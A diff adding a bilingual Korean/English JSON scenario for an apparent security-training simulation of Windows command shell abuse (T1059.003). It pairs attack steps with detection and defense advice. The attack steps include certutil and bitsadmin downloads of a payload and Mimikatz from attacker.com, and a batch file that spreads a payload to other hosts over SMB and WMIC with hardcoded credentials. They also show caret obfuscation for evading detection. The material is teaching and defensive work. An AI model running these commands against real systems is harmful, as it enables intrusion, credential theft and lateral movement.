@@ -1,0 +1,141 @@
+{
+  "id": "T1059.003",
+  "title": "Windows 명령 셸 악용 시뮬레이션",
+  "titleEn": "Windows Command Shell Exploitation Simulation",
+  "duration": 6,
+  "phases": [
+    { "label": "🔍 시스템 정찰", "labelEn": "🔍 System Recon", "steps": [0] },
+    { "label": "📥 LOLBins 다운로드", "labelEn": "📥 LOLBins Download", "steps": [1] },
+    { "label": "🎯 배치 자동화", "labelEn": "🎯 Batch Automation", "steps": [2] },
+    { "label": "🔍 탐지 & 방어", "labelEn": "🔍 Detection & Defense", "steps": [3] }
+  ],
+  "topoNodes": [
+    { "id": "attacker", "label": "Attacker\n(C2 Server)", "x": 50, "y": 80 },
+    { "id": "victim", "label": "Victim PC\n(cmd.exe)", "x": 200, "y": 80 },
+    { "id": "network", "label": "Internal\nNetwork", "x": 350, "y": 30 },
+    { "id": "fileserver", "label": "File Server\n(SMB)", "x": 350, "y": 130 },
+    { "id": "dc", "label": "Domain\nController", "x": 500, "y": 80 }
+  ],
+  "topoEdges": [
+    { "from": "attacker", "to": "victim", "minStep": 1 },
+    { "from": "victim", "to": "network", "minStep": 0 },
+    { "from": "victim", "to": "fileserver", "minStep": 2 },
+    { "from": "victim", "to": "dc", "minStep": 2 }
+  ],
+  "desktopIcons": [
+    { "name": "cmd.exe", "icon": "💻" },
+    { "name": "certutil", "icon": "📥" },
+    { "name": "bitsadmin", "icon": "⬇️" },
+    { "name": "batch.bat", "icon": "📄" },
+    { "name": "SIEM", "icon": "📊" }
+  ],
+  "steps": [
+    {
+      "cmd": "# cmd.exe 시스템 정찰\nwhoami /all\nsysteminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\" /C:\"System Type\"\nipconfig /all\nnet user & net localgroup administrators\nnetstat -ano | findstr ESTABLISHED\ntasklist /svc",
+      "out": "[사용자 정보]\ncorp\\jsmith\n  SID: S-1-5-21-...\n  그룹: Domain Users, Finance\n  권한: SeDebugPrivilege (비활성)\n\n[시스템 정보]\nOS Name:    Windows 10 Enterprise\nOS Version: 10.0.19045\nSystem Type: x64-based PC\nDomain:     corp.local\nHotfix(s):  15개 (마지막: KB5034441)\n\n[네트워크]\nIPv4: 10.0.1.50 / 255.255.255.0\nGateway: 10.0.1.1\nDNS: 10.0.0.10 (DC)\n\n[활성 연결]\n10.0.0.10:389  LDAP (DC)\n10.0.0.20:445  SMB (File Server)\n10.0.0.30:25   SMTP (Mail)\n\n[프로세스] 87개 실행 중",
+      "def": "[EDR] Reconnaissance commands executed via cmd.exe — whoami, systeminfo, net user in rapid succession",
+      "defAction": "Tool: cmd.exe built-in commands\nUser: jsmith (Domain Users, Finance)\nOS: Windows 10 Enterprise 19045\nDomain: corp.local\nConnections: DC, File Server, Mail\nProcesses: 87 running\nRisk Level: Medium\nAction: Monitor cmd.exe usage patterns, enable command-line logging",
+      "desc": "cmd.exe의 기본 명령어로 시스템 정보, 사용자, 네트워크, 프로세스를 정찰합니다. 도메인 환경과 내부 서버 연결을 확인합니다.",
+      "descEn": "Reconnaissance using built-in cmd.exe commands for system info, users, network, and processes. Identify domain environment and internal connections.",
+      "stepTitle": "cmd.exe 시스템 정찰",
+      "stepTitleEn": "cmd.exe System Reconnaissance",
+      "feynman": "새로 들어간 집(시스템)에서 '누구 집이지?(whoami)', '집 구조는?(systeminfo)', '어디로 연결돼?(ipconfig)', '다른 사람은?(net user)' 질문으로 환경을 파악합니다.",
+      "feynmanEn": "Ask questions in a new house: 'Whose house? (whoami)', 'Layout? (systeminfo)', 'Connected where? (ipconfig)', 'Who else lives here? (net user)' to understand the environment.",
+      "expert": "Event 4688(프로세스 생성)에 명령줄 인수 로깅을 활성화하면 cmd.exe 실행 명령을 모두 기록할 수 있습니다. whoami /all은 SID, 그룹, 권한을 한 번에 확인합니다. SeDebugPrivilege는 Mimikatz 실행에 필요한 권한입니다.",
+      "expertEn": "Event 4688 with command-line logging captures all cmd.exe commands. whoami /all shows SID, groups, and privileges. SeDebugPrivilege is required for Mimikatz execution.",
+      "defTooltip": "🔐 cmd.exe 정찰 명령 실행!",
+      "defTooltipEn": "🔐 cmd.exe recon commands executed!",
+      "hackerLog": { "title": "recon.log", "lines": ["[11:00:00] whoami /all 실행", "[11:00:02] systeminfo 수집", "[11:00:05] ipconfig /all 수집", "[11:00:08] net user 열거"] },
+      "terms": [
+        { "term": "Event 4688", "def": "Windows 프로세스 생성 이벤트, 명령줄 인수 감사로 cmd.exe 활동 모니터링" },
+        { "term": "SeDebugPrivilege", "def": "다른 프로세스를 디버깅할 수 있는 Windows 권한, 자격증명 덤프에 악용" }
+      ]
+    },
+    {
+      "cmd": "# certutil로 페이로드 다운로드 (LOLBin)\ncertutil -urlcache -split -f http://attacker.com/payload.exe C:\\Users\\Public\\svc.exe\n\n# bitsadmin으로 추가 도구 다운로드\nbitsadmin /transfer dl http://attacker.com/mimikatz.exe C:\\Users\\Public\\mk.exe\n\n# Base64 디코딩 실행\ncertutil -decode C:\\Temp\\encoded.txt C:\\Temp\\decoded.exe\nC:\\Temp\\decoded.exe",
+      "out": "[certutil 다운로드]\n****  Online  ****\n  0000  ...  (payload.exe)\nCertUtil: -URLCache 명령이 성공적으로 완료됨.\n→ C:\\Users\\Public\\svc.exe (245KB)\n\n[bitsadmin 다운로드]\nBITS 전송: dl\n  상태: 완료\n  크기: 1,253,376 bytes\n→ C:\\Users\\Public\\mk.exe (Mimikatz)\n\n[Base64 디코딩]\nInput Length = 332,544\nOutput Length = 249,408\nCertUtil: -decode 명령이 성공적으로 완료됨.\n→ decoded.exe 실행됨\n\n⚠️ AV 우회하여 3개 페이로드 설치",
+      "def": "[EDR] LOLBin abuse detected — certutil downloading executable from external URL, bitsadmin transfer initiated",
+      "defAction": "Tool: certutil + bitsadmin (LOLBins)\ncertutil: payload.exe downloaded (245KB)\nbitsadmin: mimikatz downloaded (1.2MB)\nBase64: Encoded payload decoded and executed\nDestination: C:\\Users\\Public\\\nRisk Level: Critical\nAction: Block certutil URL access, restrict bitsadmin",
+      "desc": "certutil과 bitsadmin(LOLBins)으로 AV를 우회하여 페이로드를 다운로드합니다. Base64 인코딩된 실행 파일도 certutil로 디코딩하여 실행합니다.",
+      "descEn": "Download payloads using certutil and bitsadmin LOLBins to bypass AV. Decode and execute Base64-encoded executable with certutil.",
+      "stepTitle": "LOLBins로 페이로드 다운로드",
+      "stepTitleEn": "LOLBins Payload Download",
+      "feynman": "집에 있는 일반 도구(인증서 도구=certutil, 다운로드 도구=bitsadmin)로 외부에서 침입 도구를 배달받습니다. 보안 경비(AV)는 정상 도구 사용이라 의심하지 않습니다.",
+      "feynmanEn": "Use regular household tools (certutil, bitsadmin) to receive burglary tools from outside. Security guards (AV) don't suspect since legitimate tools are being used.",
+      "expert": "certutil은 Windows 인증서 관리 도구지만 -urlcache 옵션으로 파일 다운로드가 가능합니다. LOLBAS 프로젝트(lolbas-project.github.io)에는 200개 이상의 LOLBin이 등록되어 있습니다. AppLocker나 WDAC로 certutil의 네트워크 활동을 제한할 수 있습니다.",
+      "expertEn": "certutil is a certificate management tool but -urlcache enables file downloads. LOLBAS project lists 200+ LOLBins. AppLocker or WDAC can restrict certutil network activity.",
+      "defTooltip": "🔐 LOLBins 페이로드 다운로드!",
+      "defTooltipEn": "🔐 LOLBins payload download!",
+      "hackerLog": { "title": "download.log", "lines": ["[11:05:00] certutil 다운로드 시작", "[11:05:10] payload.exe 저장", "[11:05:15] bitsadmin 다운로드", "[11:05:30] Base64 디코딩 실행"] },
+      "terms": [
+        { "term": "LOLBins", "def": "Living off the Land Binaries, 시스템 기본 설치 정상 도구를 악용하는 공격 기법" },
+        { "term": "certutil", "def": "Windows 인증서 유틸리티, -urlcache로 파일 다운로드, -decode로 Base64 디코딩 가능" }
+      ]
+    },
+    {
+      "cmd": "# 배치 파일 기반 자동화 공격\necho @echo off > attack.bat\necho for /F %%i in (hosts.txt) do ( >> attack.bat\necho   net use \\\\%%i\\C$ /user:admin P@ss >> attack.bat\necho   copy payload.exe \\\\%%i\\C$\\Windows\\Temp\\ >> attack.bat\necho   wmic /node:%%i process call create \"C:\\Windows\\Temp\\payload.exe\" >> attack.bat\necho ) >> attack.bat\n\n# 난독화된 cmd.exe 명령\nc^m^d /c \"w^h^o^a^m^i\"",
+      "out": "[배치 파일 생성]\nattack.bat 생성 완료\n  → hosts.txt의 모든 호스트에 대해:\n    1. SMB 연결\n    2. 페이로드 복사\n    3. 원격 실행\n\n[자동화 실행 결과]\n10.0.1.10 → 연결 성공, 실행 완료 ⚠️\n10.0.1.20 → 연결 성공, 실행 완료 ⚠️\n10.0.1.30 → 연결 실패 (인증 거부)\n10.0.1.40 → 연결 성공, 실행 완료 ⚠️\n\n[난독화 테스트]\n^ 캐럿 삽입: c^m^d → cmd 실행 성공\n%var% 치환: %comspec% → C:\\Windows\\system32\\cmd.exe\n\n⚠️ 3대 워크스테이션에 페이로드 배포 및 실행",
+      "def": "[SIEM] Batch file creating lateral movement — for loop with net use + wmic process create across multiple hosts",
+      "defAction": "Tool: batch file + wmic + net use\nBatch: attack.bat (automated deployment)\nTargets: 4 hosts (3 successful)\nMethod: SMB copy + WMIC remote exec\nObfuscation: Caret insertion (^)\nRisk Level: Critical\nAction: Block WMIC remote exec, restrict batch execution",
+      "desc": "배치 파일로 내부 호스트 목록에 대해 SMB 연결, 페이로드 복사, WMIC 원격 실행을 자동화합니다. 캐럿(^) 난독화로 탐지를 우회합니다.",
+      "descEn": "Automate SMB connection, payload copy, and WMIC remote execution across host list using batch file. Bypass detection with caret (^) obfuscation.",
+      "stepTitle": "배치 파일 자동화 + 난독화",
+      "stepTitleEn": "Batch File Automation + Obfuscation",
+      "feynman": "작업 목록(배치 파일)을 만들어 '모든 이웃집(호스트)에 가서 1)문 열고(SMB) 2)선물(페이로드) 놓고 3)시작(WMIC)' 작업을 자동으로 반복합니다. 글자 사이에 ^ 표시를 넣어 감시 카메라(탐지)를 속입니다.",
+      "feynmanEn": "Create a task list (batch file): 'For every neighbor (host): 1) Open door (SMB), 2) Leave gift (payload), 3) Start it (WMIC)' — repeated automatically. Insert ^ marks between letters to fool surveillance (detection).",
+      "expert": "for /F 루프는 텍스트 파일의 각 줄을 변수로 처리합니다. WMIC process call create는 WMI를 통해 원격 프로세스를 생성합니다. cmd.exe의 캐럿(^)은 이스케이프 문자로, c^m^d는 정상적으로 cmd로 해석됩니다. 시그니처 기반 탐지를 우회하는 데 사용됩니다.",
+      "expertEn": "for /F loop processes each line in a text file as a variable. WMIC process call create spawns remote processes via WMI. cmd.exe caret (^) is an escape character — c^m^d resolves to cmd. Used to bypass signature-based detection.",
+      "defTooltip": "🔐 배치 자동 배포 3대!",
+      "defTooltipEn": "🔐 Batch auto-deployed to 3 hosts!",
+      "hackerLog": { "title": "batch.log", "lines": ["[11:10:00] attack.bat 생성", "[11:10:05] 자동 배포 시작", "[11:10:15] 3대 성공, 1대 실패", "[11:10:20] 난독화 테스트 완료"] },
+      "terms": [
+        { "term": "WMIC", "def": "Windows Management Instrumentation CLI, 원격 시스템 관리 및 프로세스 생성 가능" },
+        { "term": "Caret Obfuscation", "def": "cmd.exe에서 ^(캐럿)을 문자 사이에 삽입하여 시그니처 탐지를 우회하는 기법" }
+      ]
+    },
+    {
+      "cmd": "# cmd.exe 악용 방어\n# AppLocker 정책\nNew-AppLockerPolicy -RuleType Deny -FileInformation cmd.exe\n\n# 명령줄 인수 로깅\nauditpol /set /subcategory:\"Process Creation\" /success:enable\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\Audit\" /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 1",
+      "out": "[AppLocker 정책]\n✅ 일반 사용자 cmd.exe 실행 제한\n✅ 관리자만 cmd.exe 허용\n✅ 배치 파일(.bat/.cmd) 실행 제한\n✅ 예외: 승인된 관리 스크립트만 허용\n\n[명령줄 감사]\n✅ Event 4688 프로세스 생성 감사 활성화\n✅ 명령줄 인수 포함 로깅\n✅ Sysmon Event 1 (Process Create) 배포\n✅ SIEM 상관분석 규칙 적용\n\n[LOLBin 방어]\n✅ certutil 네트워크 활동 차단 (WDAC)\n✅ bitsadmin 비관리자 차단\n✅ WMIC 원격 실행 비활성화\n✅ 난독화 탐지 YARA 규칙\n\n[종합]\n✅ EDR 행위 기반 탐지\n✅ 프로세스 트리 분석\n✅ 비정상 부모-자식 관계 탐지\n✅ 분기별 LOLBin 사용 감사",
+      "def": "[SIEM] CMD defense deployed — AppLocker, command-line logging, LOLBin restrictions, WMIC disabled",
+      "defAction": "Tool: AppLocker + Audit + WDAC + EDR\nAppLocker: cmd.exe restricted for users\nAudit: Event 4688 + command-line args\nLOLBin: certutil/bitsadmin/WMIC blocked\nDetection: Sysmon + YARA + process tree\nRisk Level: Low (with implementation)\nAction: Quarterly LOLBin audit",
+      "desc": "AppLocker로 일반 사용자의 cmd.exe 실행을 제한하고, 명령줄 감사를 활성화합니다. certutil/bitsadmin/WMIC의 비정상 사용을 차단하고 프로세스 트리를 분석합니다.",
+      "descEn": "Restrict cmd.exe with AppLocker for standard users, enable command-line auditing. Block abnormal certutil/bitsadmin/WMIC usage and analyze process trees.",
+      "stepTitle": "AppLocker + 명령줄 감사 + LOLBin 차단",
+      "stepTitleEn": "AppLocker + CMD Audit + LOLBin Blocking",
+      "feynman": "4가지 대책: 1) 일반인은 작업실(cmd.exe) 출입 금지(AppLocker), 2) 작업실 CCTV에 음성 녹음 추가(명령줄 로깅), 3) 일반 도구(LOLBin)로 위험한 작업 금지, 4) '아버지가 아이를 낳은' 비정상 관계 탐지(프로세스 트리).",
+      "feynmanEn": "4 measures: 1) No public access to workshop (AppLocker), 2) Add audio recording to workshop CCTV (command-line logging), 3) Ban dangerous use of regular tools (LOLBin), 4) Detect abnormal parent-child relationships (process tree).",
+      "expert": "AppLocker는 실행 파일, 스크립트, DLL에 대한 화이트리스트/블랙리스트 정책을 GPO로 적용합니다. Sysmon Event 1은 프로세스 생성 시 명령줄, 해시, 부모 프로세스 등을 기록합니다. Excel에서 cmd.exe가 생성되는 것은 비정상 프로세스 트리입니다.",
+      "expertEn": "AppLocker applies whitelist/blacklist policies for executables, scripts, and DLLs via GPO. Sysmon Event 1 logs command-line, hash, and parent process on creation. cmd.exe spawned by Excel is an abnormal process tree.",
+      "defTooltip": "🔐 cmd.exe 방어 체계 완성!",
+      "defTooltipEn": "🔐 cmd.exe defense system complete!",
+      "hackerLog": { "title": "defense.log", "lines": ["[12:00:00] AppLocker 정책 적용", "[12:05:00] 명령줄 감사 활성화", "[12:10:00] LOLBin 차단", "[12:15:00] 프로세스 트리 분석 배포"] },
+      "terms": [
+        { "term": "AppLocker", "def": "Windows 애플리케이션 실행 제어 정책, 화이트리스트/블랙리스트 기반" },
+        { "term": "Sysmon", "def": "Windows 시스템 모니터링 도구, 프로세스/네트워크/파일 이벤트 상세 로깅" }
+      ]
+    }
+  ],
+  "processTree": {
+    "name": "cmd.exe",
+    "pid": 4000,
+    "children": [
+      {
+        "name": "certutil.exe (-urlcache)",
+        "pid": 4100,
+        "children": []
+      },
+      {
+        "name": "bitsadmin.exe (/transfer)",
+        "pid": 4200,
+        "children": []
+      },
+      {
+        "name": "attack.bat",
+        "pid": 4300,
+        "children": [
+          { "name": "wmic.exe (remote exec)", "pid": 4310, "children": [] }
+        ]
+      }
+    ]
+  }
+}
